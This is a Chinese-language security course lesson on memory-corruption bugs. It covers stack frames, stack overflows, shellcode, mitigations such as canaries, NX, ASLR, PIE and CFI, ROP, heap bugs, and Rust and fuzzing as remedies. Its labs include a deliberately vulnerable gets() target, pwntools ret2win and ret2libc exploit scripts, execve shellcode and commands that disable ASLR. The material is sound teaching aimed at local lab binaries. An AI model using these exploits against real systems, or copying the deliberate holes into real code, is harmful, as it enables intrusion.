1. 栈帧：函数调用在内存里长什么样

要理解内存漏洞，你必须先在脑子里建立一张清晰的栈（stack）内存布局图。Day 01 讲进程地址空间时提过栈，今天我们把它放大 100 倍看细节。

1.1 进程地址空间回顾

一个运行中的进程，它的虚拟地址空间从低地址到高地址大致是这样布局的（x86-64 Linux）：

高地址 0x7fff... ┌────────────────────────┐ │ 栈 Stack │ ← 局部变量、返回地址，向下增长 ↓ │ ↓ │ │ │ │ ↑ │ │ 内存映射 mmap │ ← 共享库(libc)、mmap 大块内存 │ │ │ ↑ │ │ 堆 Heap │ ← malloc 分配，向上增长 ↑ ├────────────────────────┤ │ BSS (未初始化全局) │ │ Data (已初始化全局) │ │ Text (代码, 只读) │ ← 你的程序指令 └────────────────────────┘ 低地址 0x0000...

注意两个关键事实：栈向下增长（地址递减），而缓冲区（数组）向上写入（地址递增）——这个「方向相反」正是栈溢出能覆盖返回地址的物理根源。

1.2 一次函数调用，栈上发生了什么

类比：把栈想象成一摞餐盘。每调用一个函数，就往上叠一个「盘子」（栈帧 stack frame）；函数返回，就把盘子拿走。每个栈帧里装着这个函数的局部变量、参数、以及最关键的——返回地址（调用结束后该跳回哪条指令）。

看这段 C 代码：

void vuln(char *input) {
    char buf[64];        // 局部数组，64 字节
    strcpy(buf, input);  // 不检查长度地拷贝！
}
int main(int argc, char **argv) {
    vuln(argv[1]);
    return 0;
}

当 main 调用 vuln 时，栈上（x86-64，简化）从高到低是这样的：

高地址 ┌──────────────────────┐ │ main 的栈帧 ... │ ├──────────────────────┤ │ 返回地址(回到 main) │ ← 8 字节：call 指令自动压入 ├──────────────────────┤ │ 保存的 RBP (旧帧指针) │ ← 8 字节：函数开头 push rbp ├──────────────────────┤ │ │ │ buf[64] │ ← strcpy 从这里开始往高地址写 ↑ │ │ └──────────────────────┘ 低地址 ← RSP 栈顶

关键点：buf 在低地址，返回地址在高地址。strcpy 从 buf 起点往高地址方向拷贝。如果 input 超过 64+8（buf + 旧 RBP）字节，多出来的字节就会覆盖掉返回地址。

1.3 用 GDB 亲眼看栈帧

gcc -g -fno-stack-protector -o demo demo.c   # 先关掉 canary 方便观察
gdb ./demo
(gdb) break vuln
(gdb) run AAAA
(gdb) info frame          # 看当前帧的返回地址位置
(gdb) x/20gx $rsp         # 以 16 进制看栈顶 20 个 8 字节
(gdb) p &buf              # buf 的地址
(gdb) p $rbp              # 帧指针
关键事实
  • x86-64 下 call 指令自动把「下一条指令地址」压栈作为返回地址，ret 指令则把栈顶弹出到 RIP 并跳转。
  • 寄存器约定：RSP=栈顶指针，RBP=帧基指针，RIP=指令指针（下一条要执行的指令）。
  • 控制了返回地址，就等于控制了 RIP，也就控制了 CPU 接下来执行哪里——这是所有控制流劫持的目标。

2. 经典栈溢出：覆盖返回地址

缓冲区溢出（buffer overflow）：向一个固定大小的缓冲区写入超过其容量的数据，多余数据溢出到相邻内存。当溢出发生在栈上、且覆盖到返回地址时，就叫栈溢出（stack overflow，注意和递归爆栈是两回事）。

2.1 攻击三步曲

  1. 找溢出点：任何不检查长度的写入——strcpy、gets、sprintf、memcpy 长度可控、scanf("%s")。
  2. 算偏移：从缓冲区起点到返回地址有多少字节？（buf 大小 + 对齐 + 8 字节旧 RBP）
  3. 放 payload：填充 N 个垃圾字节把偏移填满，然后放上你想跳转的目标地址。

2.2 精确算偏移：cyclic 模式

手算偏移容易错。pwntools 提供了「循环模式」：生成一段不重复的字符串，崩溃后看 RIP 里是哪 4 个字符，反查偏移。

from pwn import *
# 生成 200 字节唯一模式串（每 4 字节子串都唯一）
pattern = cyclic(200)
# 程序崩溃后，看 RIP/RSP 里的值，比如 0x6161616c ('laaa')
offset = cyclic_find(0x6161616c)   # 直接算出偏移
print(offset)

2.3 最简单的利用：ret2win

CTF 入门题常有个「后门函数」（比如 win() 会 system("/bin/sh")），你只要把返回地址覆盖成 win 的地址即可：

from pwn import *
elf = ELF('./demo')
p = process('./demo')
offset = 72                         # buf(64) + rbp(8)
payload = b'A' * offset + p64(elf.symbols['win'])
p.sendline(payload)
p.interactive()                    # 弹 shell
为什么这在真实世界依然重要：你可能觉得「谁还写 strcpy」。但 2021 年 sudo 的 Baron Samedit（CVE-2021-3156）就是一个存在了 10 年的堆溢出；OpenSSL、curl、各种 IoT 固件里的溢出漏洞每年都有几十个 CVE。C/C++ 只要还在写系统底层，内存漏洞就不会消失。

3. Shellcode：把数据变成代码

如果没有现成的 win() 函数怎么办？攻击者可以自己把机器码作为数据写进缓冲区，再把返回地址指向缓冲区。这段自带的机器码就是 shellcode——因为它经典目标是启动一个 shell。

3.1 shellcode 长什么样

一段最小的 x86-64 「执行 /bin/sh」shellcode 本质是几条系统调用指令的机器码：

# 汇编逻辑（execve("/bin/sh", NULL, NULL)）
xor rsi, rsi           # argv = NULL
push rsi
mov rdi, 0x68732f2f6e69622f   # "/bin//sh" 压栈
push rdi
mov rdi, rsp           # rdi 指向字符串
xor rdx, rdx           # envp = NULL
push 0x3b              # syscall 号 59 = execve
pop rax
syscall

编成机器码后就是一串字节 \x48\x31\xf6...，长度约 20-30 字节。pwntools 一行生成：

from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())   # 自动生成 execve("/bin/sh") 的字节
print(len(sc), sc.hex())

3.2 经典布局：NOP sled + shellcode

问题：栈地址不完全可预测（尤其有 ASLR），返回地址不一定精确落在 shellcode 第一字节。解法是 NOP 滑板（NOP sled）——在 shellcode 前放一大串 \x90（NOP，什么都不做，执行下一条），只要返回地址落在滑板任意位置，CPU 就会一路「滑」到 shellcode：

[ NOP NOP NOP ... NOP ][ shellcode ][ 填充 ][ 返回地址→指向滑板中部 ] ↑ 落在这一大片区域任意处都行
但是——这种「把 shellcode 放栈上执行」的经典打法，在现代系统上默认失效。因为栈被标记为「不可执行」（NX，下一节）。理解它是为了理解后面所有缓解措施在防什么。

4. 四道防线：Canary / NX / ASLR / PIE / CFI

过去 20 年，编译器和操作系统层层加防。理解这些缓解措施，是理解现代二进制利用（以及为什么 exploit 越来越难写）的核心。

4.1 Stack Canary（栈金丝雀）

类比：矿工下井带只金丝雀，金丝雀先死说明有毒气。编译器在返回地址前面插入一个随机值（canary），函数返回前检查它有没有被改。栈溢出要覆盖返回地址，必然先覆盖 canary，检查失败就 __stack_chk_fail 直接终止程序。

┌──────────────┐ │ 返回地址 │ ├──────────────┤ │ saved RBP │ ├──────────────┤ │ 🐤 CANARY │ ← 随机值，返回前校验 ├──────────────┤ │ buf[64] │ ← 溢出必先穿过 canary └──────────────┘

怎么绕过：① 泄露 canary 值（用格式化字符串漏洞或另一个读越界读出来），再原样写回去；② 绕过校验（如果能直接改写别的指针不碰返回地址）；③ 暴力（32 位 fork 服务器，canary 不变时逐字节爆破）。

4.2 NX / DEP（数据执行保护）

NX（No-eXecute）位：CPU 页表给每页内存加一个「可执行」标记。栈和堆被标记为不可执行，代码段标记为不可写。于是「把 shellcode 写到栈上执行」直接触发段错误。这就是 §3 经典打法失效的原因。

怎么绕过：不注入新代码，而是复用程序里已有的代码片段——这就是 ret2libc 和 ROP（§5）。这是攻防史上最漂亮的一次范式转移：既然不让我带新代码，我就用你自己的零件拼。

4.3 ASLR（地址空间布局随机化）

ASLR：每次运行，把栈、堆、共享库（libc）、mmap 区域的基地址随机化。这样攻击者无法预知「libc 里 system 函数在哪」「shellcode 在栈的哪个地址」。

# 查看/临时关闭 ASLR（需 root，仅实验用）
cat /proc/sys/kernel/randomize_va_space   # 2=完全开启
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # 关闭(教学)
# 或单进程关闭：
setarch $(uname -m) -R ./demo

怎么绕过：① 信息泄露——先泄露一个 libc 地址，减去已知偏移算出 libc 基址（这叫「打 libc」）；② 未开 PIE 的程序，代码段地址固定，可直接 ROP；③ 32 位熵低可爆破。

4.4 PIE（位置无关可执行）

ASLR 只随机化库和栈堆；程序自身的代码段（Text）默认地址固定。PIE 让程序自己也能被加载到随机地址，配合 ASLR 就连你自己的函数地址也随机了。现代 gcc 默认开启 PIE。

4.5 CFI（控制流完整性）

CFI（Control-Flow Integrity）：更现代的防线。它在编译期算出「合法的间接跳转目标集合」，运行时检查每一次间接调用/返回是否跳到了合法目标。ROP 把返回地址改成 gadget 中间，CFI 一看「这不是合法的函数入口」就拦截。Clang 的 -fsanitize=cfi、Intel CET 的影子栈（shadow stack）和 ARM 的 PAC/BTI 都是这个思路的硬件/软件实现。

5. ROP / JOP：用程序自己的碎片攻击

NX 让你无法注入代码，于是攻击者发明了 ROP（Return-Oriented Programming，面向返回编程）：不注入任何新指令，而是把程序（和 libc）里已有的、以 ret 结尾的小片段（叫 gadget）串起来，用一连串精心排布的返回地址，把这些碎片拼成任意逻辑。

5.1 gadget 是什么

一个 gadget 就是几条指令 + 一个 ret，例如：

pop rdi ; ret         # 把栈上下一个值弹进 rdi，然后返回
pop rsi ; pop r15 ; ret
mov [rdi], rax ; ret

攻击者在栈上排布：[pop rdi;ret 的地址][想放进 rdi 的值][下一个 gadget 地址]...。每个 ret 都从栈上取下一个地址跳过去，栈就成了「程序」，gadget 是「指令」。

5.2 经典 ROP 目标：ret2libc 拿 shell

最常见的 ROP 目标是调用 libc 的 system("/bin/sh")。x86-64 调用约定第一个参数放 rdi，所以经典链是：

from pwn import *
elf = ELF('./demo'); libc = ELF('./libc.so.6')
# 假设已泄露 libc 基址 → 算出 system 和 "/bin/sh" 地址
system   = libc_base + libc.symbols['system']
binsh    = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi  = base + 0x... # ROPgadget 找到的 "pop rdi; ret"
ret      = base + 0x... # 一个纯 ret，用于 16 字节栈对齐

payload  = b'A'*offset
payload += p64(pop_rdi) + p64(binsh)   # rdi = "/bin/sh"
payload += p64(ret)                    # 对齐
payload += p64(system)                 # 调 system(rdi)
p.sendline(payload); p.interactive()

找 gadget 的工具：

ROPgadget --binary ./demo | grep "pop rdi"
# 或 ropper --file ./demo --search "pop rdi"

5.3 JOP 与其它变种

JOP（Jump-Oriented Programming）：用 jmp 结尾的 gadget 代替 ret，专门绕过「影子栈」这类只保护返回地址的 CFI。此外还有 ret2csu（利用 libc 初始化代码控制多个寄存器）、sigreturn-oriented（SROP，伪造信号帧一次性设置所有寄存器）。这些是同一思想的延伸：控制流被劫持后，用现存代码拼出任意能力。

攻防军备竞赛时间线（记住这条线，面试常问）： 栈溢出 → Canary → 泄露 canary → NX → ret2libc/ROP → ASLR → 信息泄露 → PIE → 泄露程序基址 → CFI/CET 影子栈 → JOP/数据流攻击。每一层都不是「彻底解决」，而是「抬高攻击成本」。

6. 堆漏洞：UAF / double free / 堆溢出

栈之外，malloc/free 管理的堆（heap）是另一大战场。堆漏洞比栈更复杂，因为它涉及分配器（Day 09 讲过的 ptmalloc/glibc malloc）的内部数据结构。

6.1 三类核心堆漏洞

Use-After-Free (UAF)

释放一块内存后继续使用那个指针（悬垂指针 dangling pointer）。如果攻击者能在 free 之后、使用之前重新 malloc 占据同一块内存并填入可控数据，就能劫持后续操作。浏览器漏洞（V8、WebKit）的头号来源。

char *p = malloc(64);
free(p);              // p 现在悬垂
// ... 攻击者让程序 malloc(64) 拿到同一块，写入伪造数据
strcpy(p, "attacker");  // 用了已释放的内存 → 灾难

Double Free（重复释放）

对同一指针 free 两次。会破坏分配器的空闲链表（free list），攻击者可借此实现「任意地址分配」——让下一次 malloc 返回一个他指定的地址，从而改写关键指针（如 GOT 表、函数指针）。

free(p);
free(p);   // glibc 新版有 tcache double-free 检测，但老版本/绕过手法很多

堆溢出（Heap Overflow）

写超出 malloc 块边界，覆盖相邻块的元数据（chunk header 里的 size、fd/bk 指针）。经典的 unlink 攻击、House of XXX 系列（House of Force / Spirit / Einherjar…）都是操纵这些元数据实现任意写。

6.2 为什么堆利用更难也更稳

难：需要「堆风水（heap feng shui / grooming）」——精确控制分配和释放的顺序，让目标块落在你能预测的位置。稳：一旦掌控 malloc 的返回，往往能实现「任意地址写任意值」（write-what-where），这是最强的原语，几乎必然能提权或 RCE。

# glibc 堆调试利器
pip install pwndbg   # GDB 插件，heap/bins/chunk 命令一目了然
# 在 gdb 里：
(gdb) heap          # 查看当前堆布局
(gdb) bins          # 查看各 free list (tcache/fastbin/...)
(gdb) vis_heap_chunks

7. 根治思路：Rust 借用检查器 + Fuzzing

前面所有缓解措施都是「打补丁」——抬高成本但没根除。真正想从源头消灭内存漏洞，有两条路：换语言和自动找 bug。

7.1 Rust：把内存安全编进类型系统

C 的问题是：谁拥有这块内存、什么时候释放、能不能同时读写——全靠程序员脑子记，记错就是漏洞。Rust 的 所有权（ownership）+ 借用（borrowing） 把这些规则变成编译期强制检查：

  • 所有权：每个值有唯一的所有者，所有者离开作用域，值自动释放（无需 GC，也不会忘记 free）。
  • 移动语义：值转移后原变量失效，编译器禁止你再用——从根上杜绝 UAF 和 double free。
  • 借用规则：要么有多个不可变引用（&T），要么只有一个可变引用（&mut T），二者不可兼得——编译期消灭数据竞争。
fn main() {
    let s = String::from("hi");
    let s2 = s;              // 所有权移动到 s2
    // println!("{}", s);   // ❌ 编译错误：s 已被移动，用不了
    println!("{}", s2);     // ✅
}

这就是微软、Google、Linux 内核、以及 Cloudflare 大规模转向 Rust 的原因：微软统计其 CVE 约 70% 是内存安全问题，Rust 能在编译期消灭其中绝大部分。代价是学习曲线陡（要跟借用检查器「搏斗」）和 unsafe 块仍是逃生舱（需人工审计）。

7.2 Fuzzing：让机器自动喂垃圾找崩溃

模糊测试（fuzzing）：自动生成大量畸形/随机输入喂给程序，监控崩溃。配合 ASan（AddressSanitizer，运行时检测越界/UAF）能把「隐性内存错误」变成「明确崩溃」。这是现代找 0-day 的主力。

# 用 AFL++ 或 libFuzzer + AddressSanitizer
clang -fsanitize=address,fuzzer -g harness.c -o fuzzer
./fuzzer -max_len=256          # 自动跑，崩溃即 dump crash 输入

# ASan 单独用（编译时加，运行即报越界）
gcc -fsanitize=address -g demo.c -o demo && ./demo AAAA...

Lab 1：写一个带后门的靶子

cat > vuln.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win() {                       // 后门函数
    printf("[+] You win! Spawning shell...\n");
    system("/bin/sh");
}
void vuln() {
    char buf[64];
    printf("Give me input: ");
    gets(buf);                     // 危险！不检查长度
}
int main() {
    setvbuf(stdout, 0, 2, 0);
    vuln();
    printf("Normal exit.\n");
    return 0;
}
EOF
# 关掉 canary + NX + PIE，制造经典可利用环境
gcc -fno-stack-protector -z execstack -no-pie -g vuln.c -o vuln
checksec vuln       # 确认 No canary / NX disabled / No PIE

Lab 2：确认崩溃 + 算偏移

# 生成 cyclic 模式喂进去，观察崩在哪
python3 -c "from pwn import *; print(cyclic(200).decode())" | ./vuln
# 用 gdb 看崩溃时的 RSP/RIP
gdb ./vuln
(gdb) run <<< "$(python3 -c 'from pwn import *; import sys; sys.stdout.buffer.write(cyclic(200))')"
# 崩溃后：
(gdb) x/gx $rsp
# 假设看到 0x616161...，用 cyclic_find 反查偏移
python3 -c "from pwn import *; print(cyclic_find(0x6161616161616166))"

Lab 3：ret2win 利用脚本

cat > exploit.py <<'EOF'
from pwn import *
elf = ELF('./vuln')
p   = process('./vuln')
offset = 72                          # 用 Lab2 算出的真实偏移替换
win = elf.symbols['win']
log.info(f"win @ {hex(win)}")
payload = b'A'*offset + p64(win)
p.recvuntil(b'input: ')
p.sendline(payload)
p.interactive()                      # 应该拿到 shell
EOF
python3 exploit.py
# 成功的话，输入 id / ls 验证是 shell

Lab 4：观察防护开启后的失败

# 重新编译，这次开启所有默认防护
gcc -g vuln.c -o vuln_safe          # 默认开 canary + NX + PIE
checksec vuln_safe
python3 -c "from pwn import *; p=process('./vuln_safe'); p.sendline(b'A'*200); print(p.recvall())"
# 观察：会看到 "*** stack smashing detected ***" —— canary 生效了

Lab 5（进阶，选做）：ASan 抓 UAF

cat > uaf.c <<'EOF'
#include <stdlib.h>
#include <string.h>
int main(){
    char *p = malloc(64);
    free(p);
    strcpy(p, "use after free");   // ASan 会精确报出这一行
    return 0;
}
EOF
gcc -fsanitize=address -g uaf.c -o uaf && ./uaf
# 阅读 ASan 报告：它会告诉你 "freed by" 和 "allocated by" 的调用栈
Lab 复盘要点：Lab 3 成功、Lab 4 失败——这个对比就是今天的核心。同一个漏洞，在「无防护」和「全防护」下的攻击难度差了几个数量级。真实 exploit 开发的 90% 工作量，是绕过 Lab 4 里那些防护（泄露 canary、泄露 libc、构造 ROP 链）。

🔗 与 AI / Agent 安全的连结

1. 推理引擎是 C/C++ 写的，内存漏洞就是逃逸起点。 你日常打交道的 vLLM、llama.cpp、TensorRT-LLM、以及底层的 CUDA kernel，全是 C/C++/CUDA。一个精心构造的超长 prompt、畸形的 GGUF 模型文件、或恶意的 tokenizer 配置，如果触发解析代码里的堆溢出，攻击者就可能在推理进程里执行任意代码——直接从「模型输入」升级到「主机 RCE」。2024 年 llama.cpp、ollama 都爆过 GGUF 解析相关的内存漏洞。做 Agent 安全，你得把「模型文件/输入」当成不可信数据，用今天讲的 fuzzing 思路去测这些解析器。

2. Agent 沙箱逃逸的最后一跳往往是内存漏洞。 你为 code-interpreter 类工具设计的沙箱（容器 / gVisor / WASM），隔离的是「正常代码」。但如果沙箱内核、容器 runtime、或 WASM runtime 自身有内存漏洞（比如 runc 的 CVE、V8 的 UAF），LLM 生成的攻击代码就能从沙箱逃到宿主。理解 ROP/堆利用，你才能评估「我的沙箱边界到底有多硬」，而不是盲目相信「跑在容器里就安全」。

3. GPU 显存的「数据即代码」风险。 今天讲的是 CPU 侧「数据被当代码执行」。GPU 上也有类似面：共享的 CUDA context、显存未清零导致的跨租户数据残留（Day 34/48 会深入）、以及 GPU kernel 里的越界写。多租户推理服务里，一个租户的越界访问可能读到另一个租户的 KV cache——这是「内存隔离」在 GPU 上的延伸。

4. 用 fuzzing 测你的 Agent 输入解析层。 Agent 系统有大量「解析不可信输入」的地方：工具返回的 JSON、检索到的文档、多模态输入的图片/音频解码。这些解析器（尤其调用 C 库的部分，如图片解码 libjpeg/libpng）都是内存漏洞高发区。把今天的 AFL++/libFuzzer + ASan 组合用到这些解析路径上，是主动发现问题的正确姿势——就像 OSS-Fuzz 对开源库做的那样。

5. 内存安全语言是 AI 基础设施的长期方向。 微软 70% CVE 是内存问题这个数据，同样适用于 AI 基础设施。越来越多的 AI infra 组件在用 Rust 重写（比如 HuggingFace 的 tokenizers、candle 推理框架、部分向量数据库）。理解 Rust 的所有权模型，不只是学门语言——是理解「为什么这些新组件从设计上就更难被内存攻击打穿」，从而在选型时把内存安全作为一个真实的安全指标。
